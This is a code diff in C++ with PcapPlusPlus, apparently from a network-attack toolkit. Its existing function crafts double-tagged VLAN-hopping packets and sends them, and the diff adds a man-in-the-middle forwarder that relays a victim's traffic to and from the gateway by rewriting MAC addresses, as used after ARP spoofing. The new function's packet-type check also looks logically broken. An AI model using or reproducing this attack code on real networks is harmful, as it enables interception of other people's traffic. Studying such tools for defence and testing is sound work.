@@ -36,7 +36,6 @@ void ashk::PacketReceiver::onPacketArrivesArpPoisoningDetection(pcpp::RawPacket 
 
 void ashk::PacketReceiver::onPacketArrivesVlanHopping(pcpp::RawPacket *rawPacket, pcpp::PcapLiveDevice *dev, void *cookie) {
 
-
     auto *data = static_cast<VlanHoppingCookie *>(cookie);
 
     // Parse the original packet
@@ -60,8 +59,6 @@ void ashk::PacketReceiver::onPacketArrivesVlanHopping(pcpp::RawPacket *rawPacket
     pcpp::Packet new_packet(rawPacket->getRawDataLen()+100);
     pcpp::EthLayer new_ethlayer(srcMac,dstMac,PCPP_ETHERTYPE_VLAN);
 
-
-
     pcpp::VlanLayer outerVlan(2,    // VLAN ID
                         0,      // Priority
                         0,      // DEI
@@ -75,7 +72,6 @@ void ashk::PacketReceiver::onPacketArrivesVlanHopping(pcpp::RawPacket *rawPacket
     new_packet.addLayer(&outerVlan);
     new_packet.addLayer(&innerVlan);
 
-
     for(pcpp::Layer *layer=ethLayer->getNextLayer();layer!= nullptr;layer=layer->getNextLayer()){
         uint8_t lArr[layer->getDataLen()];
         layer->copyData(lArr);
@@ -84,5 +80,32 @@ void ashk::PacketReceiver::onPacketArrivesVlanHopping(pcpp::RawPacket *rawPacket
     }
     new_packet.computeCalculateFields();
     dev->sendPacket(&new_packet);
+}
+
+void ashk::PacketReceiver::onPacketArrivesMITMForwarding(pcpp::RawPacket *raw_packet, pcpp::PcapLiveDevice *dev,
+                                                         void *cookie) {
+    auto *data = static_cast<MITMForwardingCookie *>(cookie);
+    pcpp::Packet packet(raw_packet);
+
+    if (!packet.isPacketOfType(pcpp::Ethernet) ||
+        !packet.isPacketOfType(pcpp::ARP))
+        return;
+
+    auto eth_layer = packet.getLayerOfType<pcpp::EthLayer>();
+    auto ip_layer = packet.getLayerOfType<pcpp::IPLayer>();
+
+    if(eth_layer->getSourceMac()==dev->getMacAddress()){
+        return;
+    }
+    if (ip_layer->getSrcIPAddress()==data->victim_ip){
+        eth_layer->setDestMac(data->gateway_mac);
+        dev->sendPacket(&packet);
+        return;
+    }
+    if(ip_layer->getDstIPAddress()==data->victim_ip){
+        eth_layer->setDestMac(data->victim_mac);
+        dev->sendPacket(&packet);
+        return;
+    }
 }
 
